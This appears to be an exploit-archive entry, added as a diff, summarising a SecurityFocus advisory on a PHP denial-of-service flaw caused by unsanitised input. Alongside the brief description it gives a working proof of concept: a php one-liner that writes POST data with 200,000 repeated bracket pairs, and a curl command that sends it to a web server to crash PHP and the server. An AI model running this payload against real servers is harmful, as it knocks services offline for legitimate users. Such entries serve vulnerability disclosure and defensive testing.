@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/22764/info
+
+PHP is prone to a denial-of-service vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker who can run PHP code on a vulnerable computer may exploit this vulnerability to crash PHP and the webserver, denying service to legitimate users.
+
+This issue affects all versions of PHP. 
+
+$ php -r 'echo "a".str_repeat("[]",200000)."=1&a=0";' > postdata
+
+$ curl http://www.example.com/ -d @postdata
+
